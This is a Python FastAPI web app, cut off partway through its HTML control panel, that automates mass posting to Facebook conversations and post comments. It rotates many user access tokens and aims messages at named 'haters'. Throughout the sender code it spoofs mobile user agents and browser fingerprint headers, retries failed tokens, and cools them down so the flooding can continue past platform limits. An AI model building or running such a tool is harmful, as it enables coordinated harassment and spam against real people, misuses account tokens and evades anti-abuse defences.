import time
import random
import re
import requests
import os
import aiohttp
import asyncio
import brotli
import gzip
from datetime import datetime, timedelta, timezone
import uvicorn
from fastapi import FastAPI, Request, Form, UploadFile, File
from fastapi.responses import HTMLResponse, PlainTextResponse, FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from threading import Thread, Event

# Optional curl_cffi for real browser fingerprinting
try:
    from curl_cffi import requests as curl_requests
    USE_CURL = True
except ImportError:
    curl_requests = requests
    USE_CURL = False

# ---------------- FastAPI app ----------------
app = FastAPI(debug=True)
templates = Jinja2Templates(directory="templates")  # optional if you use external templates

# ---------------- Globals ----------------
stop_events = {}
pause_events = {}
threads = {}
task_meta = {}  # store token_ua_map per task if needed
tasks = {}
# ----------------- UA pool (expand as needed) -----------------
user_agents = [
    # ----- Yandex Browser (YaBrowser 19–23) -----
    "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 YaBrowser/20.3.2.71 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 YaBrowser/20.6.3.78 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 YaBrowser/20.8.3.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 YaBrowser/20.9.0.104 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 YaBrowser/21.2.1.122 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 YaBrowser/21.5.0.128 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 YaBrowser/23.7.3.79 Mobile Safari/537.36",
    # ----- UC Browser (v11–v13) -----
    "Mozilla/5.0 (Linux; U; Android 8.1.0; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 UCBrowser/12.13.2.1207 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 8.1.0; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 UCBrowser/13.4.0.1306 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 8.1.0; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 UCBrowser/12.10.5.1170 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 8.1.0; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 UCBrowser/11.6.8.952 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 8.1.0; Redmi Note 5 Pro Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 UCBrowser/13.2.2.1290 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 8.1.0; Redmi Note 5 Pro Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 UCBrowser/12.8.9.1158 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 8.1.0; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 UCBrowser/13.5.0.1318 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 8.1.0; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.111 UCBrowser/14.0.0.1353 Mobile Safari/537.36",
    ]

# ---------------- Utilities ----------------
async def read_single_number(request: Request, param_name: str, default: float = 1.0):
    try:
        form = await request.form()
        value = form.get(param_name, default)
        return float(value)
    except (ValueError, TypeError):
        return float(default)

def get_kolkata_time():
    kolkata_offset = timedelta(hours=5, minutes=30)
    kolkata_time = datetime.now(timezone.utc) + kolkata_offset
    return kolkata_time.strftime('%d-%m-%Y %I:%M:%S %p IST')

def map_tokens_to_ua_stable(tokens, ua_pool=None):
    """Deterministically map each token to a UA from ua_pool."""
    if ua_pool is None:
        ua_pool = user_agents  # default global list use karega

    token_ua = {}
    pool_len = len(ua_pool)
    for t in tokens:
        idx = abs(hash(t)) % pool_len
        token_ua[t] = ua_pool[idx]
    return token_ua

#----------HEADERS FETCH ---------
def get_headers(token=None, token_ua_map=None, referer="https://www.facebook.com/"):
    ua_string = (token_ua_map.get(token) if token_ua_map and token else None) or random.choice(user_agents)

    # Detect browser & version
    browser_name, browser_version, major_version = "Unknown", "0.0.0.0", "0"

    browser_patterns = [
        r'(Chrome|CriOS)/([0-9\.]+)',                     # Chrome / iOS Chrome
        r'(Firefox|FxiOS|FirefoxMobile)/([0-9\.]+)',      # Firefox variants
        r'(Edg|Edge)/([0-9\.]+)',                         # Edge
        r'(Opera|OPR)/([0-9\.]+)',                        # Opera
        r'Version/([0-9\.]+).*Safari',                    # Safari
        r'(YaBrowser)/([0-9\.]+)',                        # Yandex Browser
        r'(Brave)/([0-9\.]+)',                            # Brave Browser
        r'(Vivaldi)/([0-9\.]+)',                          # Vivaldi Browser
        r'(SamsungBrowser)/([0-9\.]+)',                   # Samsung Internet
        r'(UCBrowser)/([0-9\.]+)',                        # UC Browser
        r'(Via)/([0-9\.]+)',                              # Via Browser
    ]

    for pattern in browser_patterns:
        match = re.search(pattern, ua_string)
        if match:
            if len(match.groups()) == 2:
                browser_name, browser_version = match.groups()
            else:
                browser_name = "Safari"
                browser_version = match.group(1)
            major_version = browser_version.split('.')[0]
            break

    # Detect platform
    platform_name, platform_version, is_mobile = "Unknown", "", False

    if "Android" in ua_string:
        platform_name = "Android"
        m = re.search(r'Android[ /-]?([0-9.]+)', ua_string)
        platform_version = m.group(1) if m else ""
        is_mobile = True
    elif "iPhone" in ua_string:
        platform_name = "iOS"
        m = re.search(r'CPU iPhone OS (\d+[_\d]*)', ua_string)
        platform_version = m.group(1).replace("_", ".") if m else ""
        is_mobile = True
    elif "iPad" in ua_string:
        platform_name = "iPadOS"
        m = re.search(r'CPU OS (\d+[_\d]*)', ua_string)
        platform_version = m.group(1).replace("_", ".") if m else ""
        is_mobile = True
    elif "Windows Phone" in ua_string:
        platform_name = "Windows Phone"
        m = re.search(r'Windows Phone (?:OS )?([0-9.]+)', ua_string)
        platform_version = m.group(1) if m else ""
        is_mobile = True
    elif "Windows NT" in ua_string:
        platform_name = "Windows"
        m = re.search(r'Windows NT ([0-9.]+)', ua_string)
        platform_version = m.group(1) if m else ""
    elif "Mac OS X" in ua_string:
        platform_name = "macOS"
        m = re.search(r'Mac OS X (\d+[_\d]*)', ua_string)
        platform_version = m.group(1).replace("_", ".") if m else ""
    elif "Linux" in ua_string:
        platform_name = "Linux"

    # Build Accept-Language
    accept_language = (
        "en-US,en;q=0.9,hi-IN;q=0.8,fr-FR;q=0.8,de-DE;q=0.7,"
        "es-ES;q=0.7,it-IT;q=0.6,ru-RU;q=0.5,ja-JP;q=0.4,"
        "zh-CN;q=0.4,ko-KR;q=0.4,ar-SA;q=0.3,tr-TR;q=0.3"
    )

    # Build headers
    headers = {
        "User-Agent": ua_string,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": accept_language,
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": referer,
        "Origin": "https://www.facebook.com",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
        "sec-ch-ua": f'"Not)A;Brand";v="24", "{browser_name}";v="{major_version}"',
        "sec-ch-ua-mobile": "?1" if is_mobile else "?0",
        "sec-ch-ua-platform": f'"{platform_name}"',
        "sec-ch-ua-full-version-list": f'"Not)A;Brand";v="24.0.0.0", "{browser_name}";v="{browser_version}"',
        "Sec-CH-UA-Platform-Version": platform_version or "",
        "DNT": "1",
        "TE": "trailers",
    }

    return headers

# ====== ADVANCED ASYNC SENDER WITH AUTO COOLDOWN ======

async def fetch_url(url, headers):
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get(url, timeout=20) as response:
            data = await response.read()
            encoding = response.headers.get('Content-Encoding', '').lower()

            if encoding == 'br':
                text = brotli.decompress(data).decode('utf-8', errors='ignore')
            elif encoding == 'gzip':
                text = gzip.decompress(data).decode('utf-8', errors='ignore')
            else:
                text = data.decode('utf-8', errors='ignore')

            print(text[:300])
            return text


async def send_messages_async(tokens, Convo_ids, Post_ids, hater_names, messages,
                              sender_names, delay, batch_count, batch_delay,
                              loop_delay, task_id, token_ua_map):

    stop_event = stop_events[task_id]
    pause_event = pause_events[task_id]

    token_index = 0
    msg_index = 0

    invalid_tokens = set()
    last_checked = {}
    retry_after = 60  # seconds
    token_fail_count = {}  # consecutive timeout/error counter
    cooldown_tokens = {}   # token: cooldown_until_timestamp

    # Colors
    RESET = "\033[0m"; CYAN = "\033[96m"; GREEN = "\033[32m"
    BLUE = "\033[94m"; LIGHT_GREEN = "\033[92m"; YELLOW = "\033[93m"; RED = "\033[91m"

    token_count = len(tokens)
    if token_count == 0:
        print(f"{RED}[send_messages] {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
                  f"{BLUE}TASK {task_id} {RESET} No tokens provided.{RESET}")
        return

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            access_token = tokens[token_index % token_count]
            token_no = (token_index % token_count) + 1
            headers = get_headers(access_token, token_ua_map)
            now = time.time()

            # Skip tokens on cooldown
            if access_token in cooldown_tokens:
                cooldown_end = cooldown_tokens[access_token]
                if now < cooldown_end:
                    wait_left = int(cooldown_end - now)
                    print(f"{YELLOW}[{get_kolkata_time()}] {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
                  f"{BLUE}TASK {task_id} {RESET} Token {token_no} on cooldown ({wait_left}s left){RESET}")
                    token_index += 1
                    continue
                else:
                    del cooldown_tokens[access_token]
                    token_fail_count[access_token] = 0
                    print(f"{CYAN}[{get_kolkata_time()}] {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
                  f"{BLUE}TASK {task_id} {RESET} Token {token_no} cooldown over, reactivated.{RESET}")

            # Skip invalid tokens temporarily
            if access_token in invalid_tokens:
                if now - last_checked.get(access_token, 0) < retry_after:
                    token_index += 1
                    continue
                # Try recovery check
                try:
                    async with session.get(
                        f"https://graph.facebook.com/me?access_token={access_token}",
                        timeout=15
                    ) as res:
                        data = await res.json()
                        if res.status == 200 and 'id' in data:
                            print(f"{CYAN}[{get_kolkata_time()}] {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
                  f"{BLUE}TASK {task_id} {RESET} Token recovered: {access_token[:10]}...{RESET}")
                            invalid_tokens.discard(access_token)
                            token_fail_count[access_token] = 0
                        else:
                            last_checked[access_token] = now
                            token_index += 1
                            continue
                except Exception:
                    last_checked[access_token] = now
                    token_index += 1
                    continue

            # -------- Send Messages in Batch --------
            for batch_msg_index in range(batch_count):
                if stop_event.is_set():
                    break
                await pause_event.wait()

                start_time = time.perf_counter()
                msg = messages[msg_index % len(messages)]
                msg_index += 1
                sender = random.choice(sender_names).strip()
                hater = random.choice(hater_names).strip()
                full_msg = f"{hater} {msg.strip()}\n{sender}".strip()
                event_time = get_kolkata_time()

                async def post_with_retry(url, params, headers, retries=2):
                    """Retry POST if timeout or connection fails"""
                    for attempt in range(retries + 1):
                        try:
                            async with session.post(url, data=params, headers=headers, timeout=25) as resp:
                                text = await resp.text()
                                return resp.status, text
                        except asyncio.TimeoutError:
                            print(f"{RED}[{event_time}] {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
                  f"{BLUE}TASK {task_id} {RESET} Timeout: Token {token_no} (Attempt {attempt+1}){RESET}")
                            if attempt < retries:
                                await asyncio.sleep(3)
                                continue
                            return None, "Timeout"
                        except Exception as e:
                            print(f"{RED}[{event_time}] {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
                  f"{BLUE}TASK {task_id} {RESET} Exception (Token {token_no}): {str(e)}{RESET}")
                            if attempt < retries:
                                await asyncio.sleep(2)
                                continue
                            return None, str(e)

                # ---- Send to conversation ----
                if Convo_ids:
                    convo_id = random.choice(Convo_ids)
                    url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
                    params = {'access_token': access_token, 'message': full_msg}
                    status, text = await post_with_retry(url, params, headers)
                    if status == 200:
                        print(f"{CYAN}[{event_time}]{RESET} {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
      f"{BLUE}TASK {task_id}{RESET} "
      f"{GREEN}✔ SENT Batch {batch_msg_index+1}/{batch_count}{RESET} "
      f"(Token #{token_no}/{token_count}) {YELLOW}{hater}{RESET}: {GREEN}{msg.strip()}{RESET} {CYAN}{sender}{RESET}")
                        token_fail_count[access_token] = 0  # reset fail counter
                    elif status in [400, 401, 403]:
                        print(f"{RED}[{event_time}] {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
                  f"{BLUE}TASK {task_id} {RESET} Token {token_no} failed Convo: {text}{RESET}")
                        invalid_tokens.add(access_token)
                        last_checked[access_token] = time.time()
                        break
                    else:
                        token_fail_count[access_token] = token_fail_count.get(access_token, 0) + 1

                # ---- Send to post comment ----
                if Post_ids:
                    post_id = random.choice(Post_ids)
                    url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
                    params = {'access_token': access_token, 'message': full_msg}
                    status, text = await post_with_retry(url, params, headers)
                    if status == 200:
                        print(f"{CYAN}[{event_time}]{RESET} {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
                  f"{BLUE}TASK {task_id}{RESET} "
                  f"{GREEN}✔ COMMENT Batch {batch_msg_index+1}/{batch_count}{RESET} "
                  f"(Token {token_no}/{token_count} {RESET} "
                  f"{YELLOW}{hater}{RESET}: {GREEN}{msg.strip()}{RESET} {CYAN}{sender}{RESET}")
                        token_fail_count[access_token] = 0
                    elif status in [400, 401, 403]:
                        print(f"{RED}[{event_time}] {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
                  f"{BLUE}TASK {task_id} {RESET} Token {token_no} failed Post: {text}{RESET}")
                        invalid_tokens.add(access_token)
                        last_checked[access_token] = time.time()
                        break
                    else:
                        token_fail_count[access_token] = token_fail_count.get(access_token, 0) + 1

                # ---- Check for repeated failures ----
                if token_fail_count.get(access_token, 0) >= 3:
                    cooldown_until = time.time() + 300  # 5 min cooldown
                    cooldown_tokens[access_token] = cooldown_until
                    print(f"{YELLOW}[{event_time}] {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
                  f"{BLUE}TASK {task_id} {RESET} Token {token_no} cooling down for 5 min (3 consecutive fails){RESET}")
                    break

                # Per message delay
                elapsed = time.perf_counter() - start_time
                rem_delay = delay - elapsed
                if rem_delay > 0:
                    await asyncio.sleep(rem_delay)
                print(f"{CYAN}[{get_kolkata_time()}]{RESET} {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
                  f"{BLUE}TASK {task_id} {RESET} {LIGHT_GREEN}Delay:{RESET} {GREEN}{delay:.2f}s{RESET}")

            # Batch delay
            if batch_delay > 0:
                await asyncio.sleep(batch_delay)
                print(f"{CYAN}[{get_kolkata_time()}]{RESET} {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
                  f"{BLUE}TASK {task_id} {RESET} {LIGHT_GREEN}Batch Delay:{RESET} {GREEN}{batch_delay:.2f}s{RESET}")

            token_index += 1

            # Loop delay after all tokens
            if token_index % token_count == 0 and loop_delay > 0:
                await asyncio.sleep(loop_delay)
                print(f"{CYAN}[{get_kolkata_time()}]{RESET} {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
                  f"{BLUE}TASK {task_id} {RESET} {LIGHT_GREEN}Loop Delay:{RESET} {GREEN}{loop_delay:.2f}s{RESET}")

    print(f"{CYAN}[{get_kolkata_time()}] {LIGHT_GREEN}[4KK1-H3R3]{RESET} "
                  f"{BLUE}TASK {task_id} {RESET} Task {task_id} completed.{RESET}")


# ---------------- Helper to read either manual or file fields ----------------
async def _read_input_from_form(req: Request, option_key: str, manual_key: str, file_key: str):
    form = await req.form()
    # If field exists as manual option flag (older UI), keep compatibility
    # Here we accept both direct manual value or uploaded file
    if form.get(manual_key):
        val = form.get(manual_key)
        return [v for v in val.strip().splitlines() if v.strip()]
    # else try file
    f = form.get(file_key)
    if f and hasattr(f, "read"):
        raw = await f.read()
        try:
            txt = raw.decode()
        except Exception:
            txt = raw.decode('utf-8', 'ignore')
        return [v for v in txt.strip().splitlines() if v.strip()]
    return []

# ---------------- Global dicts ----------------
@app.post("/start_task/", response_class=HTMLResponse)
async def start_task(request: Request):
    # ---------------- Read inputs ----------------
    tokens = await _read_input_from_form(request, 'tokensOption', 'SingleToken', 'TokenFile')
    convo_ids = await _read_input_from_form(request, 'ConvoOption', 'ConvoId', 'ConvoFile')
    post_ids = await _read_input_from_form(request, 'postOption', 'postId', 'postFile')
    messages = await _read_input_from_form(request, 'msgOption', 'message', 'messageFile')
    sender_names = await _read_input_from_form(request, 'senderOption', 'senderName', 'senderFile')
    hater_names = await _read_input_from_form(request, 'haterOption', 'haterName', 'haterFile')

    delay = float(await read_single_number(request, "delay", 1))
    batch_count = int(await read_single_number(request, "batchCount", 1))
    batch_delay = float(await read_single_number(request, "batchDelay", 1))
    loop_delay = float(await read_single_number(request, "loopDelay", 1))

    # ---------------- Ensure lists exist ----------------
    tokens = tokens or []
    convo_ids = convo_ids or []
    post_ids = post_ids or []
    messages = messages or []
    sender_names = sender_names or []
    hater_names = hater_names or []

    if not tokens:
        return HTMLResponse(content="<h3>❌ No tokens provided!</h3>", status_code=400)

    # ---------------- Generate unique task_id ----------------
    while True:
        task_id = ''.join(random.choices('123456789', k=4))
        if task_id not in stop_events:
            break

    # ---------------- Create asyncio events ----------------
    stop_events[task_id] = asyncio.Event()
    pause_events[task_id] = asyncio.Event()
    pause_events[task_id].set()  # initially not paused

    # ---------------- Map tokens to UAs ----------------
    token_ua_map = map_tokens_to_ua_stable(tokens)
    task_meta[task_id] = {"token_ua_map": token_ua_map}

    # ---------------- Start async background task ----------------
    async def background_sender():
        await send_messages_async(
            tokens, convo_ids, post_ids, hater_names, messages, sender_names,
            delay, batch_count, batch_delay, loop_delay, task_id, token_ua_map
        )
        # Cleanup when finished
        stop_events.pop(task_id, None)
        pause_events.pop(task_id, None)
        tasks.pop(task_id, None)

    task = asyncio.create_task(background_sender())
    tasks[task_id] = task

    return HTMLResponse(content=f"<h3>✅ Task started! Task ID: {task_id}</h3>")

    # ---------------- Return success HTML ----------------
    return HTMLResponse(
        content=f"<h3>✅ Task started successfully! Task ID: {task_id}</h3>",
        status_code=200
    )

# Favicon route
@app.get("/favicon.ico", include_in_schema=False)
async def favicon():
    return FileResponse
    
@app.get("/akki.png")
def akki_pic():
    return FileResponse("akki.png")

@app.post("/pause")
async def pause_task(request: Request):
    form = await request.form()
    task_id = form.get("taskId")
    if task_id and task_id in pause_events:
        pause_events[task_id].clear()
        return PlainTextResponse(f"Task {task_id} paused.")
    return PlainTextResponse("Invalid task ID.")

@app.post("/resume")
async def resume_task(request: Request):
    form = await request.form()
    task_id = form.get("taskId")
    if task_id and task_id in pause_events:
        pause_events[task_id].set()
        return PlainTextResponse(f"Task {task_id} resumed.")
    return PlainTextResponse("Invalid task ID.")

@app.post("/stop")
async def stop_task(request: Request):
    form = await request.form()
    task_id = form.get("taskId")
    if task_id and task_id in stop_events:
        stop_events[task_id].set()
        return PlainTextResponse(f"Task {task_id} stopped.")
    return PlainTextResponse("Invalid task ID.")

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>4KK1-H3R3</title>
  <link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css' rel='stylesheet'>

  <style>
    body {
      background: #000;
      color: #00ffff;
      font-family: Arial, sans-serif;
      margin: 0;
      padding-bottom: 80px;
    }

    .panel-box {
      background: url('akki.png') no-repeat center center;
      background-size: cover; /* fills entire panel */
      background-color: transparent;
      padding: 20px;
      border: 3px solid #00ffff;
      border-radius: 10px;
      box-shadow: 0 0 15px #00ffff88;
      max-height: 93vh;
      overflow-y: auto;
      animation: pulseGlow 4s infinite alternate;
    }

    @keyframes pulseGlow {
      from { box-shadow: 0 0 10px #00ffff30; }
      to { box-shadow: 0 0 30px #00ffff; }
    }

    .form-control,
    .btn,
    select,
    textarea,
    input[type="file"] {
      background-color: transparent !important;
      color: #00ffff !important;
      border: 1px solid #00ffff !important;
      border-radius: 12px;
      box-shadow: none !important;
      transition: all 0.4s ease-in-out;
    }

    .form-control:focus,
    .btn:focus,
    select:focus {
      box-shadow: 0 0 15px #00ffff !important;
      outline: none !important;
    }

    .form-control::placeholder,
    label {
      color: #00ffff !important;
    }

    .btn:hover {
      background-color: rgba(0, 255, 204, 0.2) !important;
      color: #ffffff !important;
      box-shadow: 0 0 14px #00ffff;
      transform: scale(1.03);
    }

    .accordion-button,
    .accordion-item,
    .accordion-body {
      background-color: transparent !important;
      color: #00ffff !important;
      border: none !important;
    }

    .accordion-item {
      border: 1px solid #00ffff !important;
      border-radius: 8px;
    }

    .task-box {
      border: 2px solid #00ffff;
      border-radius: 10px;
      padding: 15px;
      margin-top: 15px;
      box-shadow: 0 0 10px #00ffff80;
      background-color: transparent;
      animation: pulseGlowBox 4s infinite alternate;
    }

    @keyframes pulseGlowBox {
      from { box-shadow: 0 0 8px #00ffff40; }
      to { box-shadow: 0 0 16px #00ffffc0; }
    }

    h2 {
      text-align: center;
      font-size: 26px;
      margin-bottom: 16px;
      color: #00ffff;
      text-shadow: 0 0 12px #00ffff;
    }

    .footer {
      text-align: center;
      color: #00ffff;
      font-size: 14px;
      position: fixed;
      bottom: 0;
      width: 100%;
      background: linear-gradient(90deg, #001a1a, #002f2f);
      border-top: 2px solid #00ffff;
      box-shadow: 0 -2px 8px #00ffff;
      padding: 8px 0;
    }

    .btn-pause { border-color: #ffc107 !important; color: #ffc107 !important; }
    .btn-resume { border-color: #0dcaf0 !important; color: #0dcaf0 !important; }
    .btn-stop { border-color: #dc3545 !important; color: #dc3545 !important; }

    .btn-pause:hover { background-color: rgba(255, 193, 7, 0.2) !important; box-shadow: 0 0 13px #ffc107; }
    .btn-resume:hover { background-color: rgba(13, 202, 240, 0.2) !important; box-shadow: 0 0 13px #0dcaf0; }
    .btn-stop:hover { background-color: rgba(220, 53, 69, 0.2) !important; box-shadow: 0 0 13px #dc3545; }

    /* Make control buttons evenly sized and full width in row */
    #taskControlForm .btn-pause,
    #taskControlForm .btn-resume,
    #taskControlForm .btn-stop {
      width: 100%;
    }
  </style>

  <script>
    function toggleInputs(field, val) {
      document.getElementById(field + 'Manual').style.display = (val == 'manual') ? 'block' : 'none';
      document.getElementById(field + 'File').style.display = (val == 'file') ? 'block' : 'none';
    }

    async function sendTaskAction(action) {
  const id = document.getElementById('taskId').value.trim();
  if (!id) {
      alert("Please enter a Task ID first!");
      return;
  }

  const formData = new FormData();
  formData.append('taskId', id);

  try {
      const res = await fetch(`/${action}`, { method: 'POST', body: formData });
      const text = await res.text();  // <-- use text() instead of json()
      alert(text); // ab valid JSON error nahi aayega
  } catch (err) {
      alert('Error sending request: ' + err);
  }
}
  </script>
</head>

<body>
  <div class='container-fluid'>
    <div class='panel-box'>
      <h2>💚🎵 『4KK1-H3R3』🎵💚</h2>

      <form method="POST" enctype="multipart/form-data" action="/start_task/">
        <div class="accordion" id="formAccordion">

          <!-- TOKEN -->
          <div class="accordion-item">
            <h2 class="accordion-header" id="headingToken">
              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseToken">
                TOKEN INPUT
              </button>
            </h2>
            <div id="collapseToken" class="accordion-collapse collapse" data-bs-parent="#formAccordion">
              <div class="accordion-body">
                <select class='form-control' name='tokensOption' onchange="toggleInputs('tokens', this.value)">
                  <option value=''>None</option>
                  <option value='manual'>Manual</option>
                  <option value='file'>File</option>
                </select>
                <input type='text' class='form-control' name='SingleToken' id='tokensManual' placeholder='Enter Token' style='display:none'>
                <input type='file' class='form-control' name='TokenFile' id='tokensFile' style='display:none'>
              </div>
            </div>
          </div>

          <!-- CONVO -->
          <div class="accordion-item">
            <h2 class="accordion-header" id="headingConvo">
              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseConvo">
                CONVO ID
              </button>
            </h2>
            <div id="collapseConvo" class="accordion-collapse collapse" data-bs-parent="#formAccordion">
              <div class="accordion-body">
                <select class='form-control' name='ConvoOption' onchange="toggleInputs('Convo', this.value)">
                  <option value=''>None</option>
                  <option value='manual'>Manual</option>
                  <option value='file'>File</option>
                </select>
                <input type='text' class='form-control' name='ConvoId' id='ConvoManual' placeholder='Enter Convo ID' style='display:none'>
                <input type='file' class='form-control' name='ConvoFile' id='ConvoFile' style='display:none'>
              </div>
            </div>
          </div>

          <!-- POST -->
          <div class="accordion-item">
            <h2 class="accordion-header" id="headingPost">
              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapsePost">
                POST ID
              </button>
            </h2>
            <div id="collapsePost" class="accordion-collapse collapse" data-bs-parent="#formAccordion">
              <div class="accordion-body">
                <select class='form-control' name='postOption' onchange="toggleInputs('post', this.value)">
                  <option value=''>None</option>
                  <option value='manual'>Manual</option>
                  <option value='file'>File</option>
                </select>
                <input type='text' class='form-control' name='postId' id='postManual' placeholder='Enter Post ID' style='display:none'>
                <input type='file' class='form-control' name='postFile' id='postFile' style='display:none'>
              </div>
            </div>
          </div>

          <!-- HATER -->
          <div class="accordion-item">
            <h2 class="accordion-header" id="headingHater">
              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseHater">
                HATER NAME
              </button>
            </h2>
            <div id="collapseHater" class="accordion-collapse collapse" data-bs-parent="#formAccordion">
              <div class="accordion-body">
                <select class='form-control' name='haterOption' onchange="toggleInputs('hater', this.value)">
                  <option value=''>None</option>
                  <option value='manual'>Manual</option>
                  <option value='file'>File</option>
                </select>
                <input type='text' class='form-control' name='haterName' id='haterManual' placeholder='Enter hater Name' style='display:none'>
                <input type='file' class='form-control' name='haterFile' id='haterFile' style='display:none'>
              </div>
            </div>
          </div>

          <!-- MESSAGE -->
          <div class="accordion-item">
            <h2 class="accordion-header" id="headingMsg">
              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseMsg">
                MESSAGE / COMMENT TEXT
              </button>
            </h2>
            <div id="collapseMsg" class="accordion-collapse collapse" data-bs-parent="#formAccordion">
              <div class="accordion-body">
                <select class='form-control' name='msgOption' onchange="toggleInputs('msg', this.value)">
                  <option value=''>None</option>
                  <option value='manual'>Manual</option>
                  <option value='file'>File</option>
                </select>
                <input type='text' class='form-control' name='message' id='msgManual' placeholder='Enter Message' style='display:none'>
                <input type='file' class='form-control' name='messageFile' id='msgFile' style='display:none'>
              </div>
            </div>
          </div>

          <!-- SENDER -->
          <div class="accordion-item">
            <h2 class="accordion-header" id="headingSender">
              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseSender">
                SENDER NAME
              </button>
            </h2>
            <div id="collapseSender" class="accordion-collapse collapse" data-bs-parent="#formAccordion">
              <div class="accordion-body">
                <select class='form-control' name='senderOption' onchange="toggleInputs('sender', this.value)">
                  <option value=''>None</option>
                  <option value='manual'>Manual</option>
                  <option value='file'>File</option>
                </select>
                <input type='text' class='form-control' name='senderName' id='senderManual' placeholder='Enter Sender Name' style='display:none'>
                <input type='file' class='form-control' name='senderFile' id='senderFile' style='display:none'>
              </div>
            </div>
          </div>

          <!-- DELAY -->
          <div class="accordion-item">
            <h2 class="accordion-header" id="headingDelay">
              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseDelay">
                MESSAGE DELAY
              </button>
            </h2>
            <div id="collapseDelay" class="accordion-collapse collapse" data-bs-parent="#formAccordion">
              <div class="accordion-body">
                <select class='form-control' name='delayOption' onchange="toggleInputs('delay', this.value)">
                  <option value=''>None</option>
                  <option value='manual'>Manual</option>
                  <option value='file'>File</option>
                </select>
                <input type='text' class='form-control' name='delay' id='delayManual' placeholder='Enter Delay' style='display:none'>
                <input type='file' class='form-control' name='delayFile' id='delayFile' style='display:none'>
              </div>
            </div>
          </div>

          <!-- BATCH COUNT -->
          <div class="accordion-item">
            <h2 class="accordion-header" id="batchCountHeading">
              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#batchCountCollapse" aria-expanded="false" aria-controls="batchCountCollapse">
                BATCH COUNT
              </button>
            </h2>
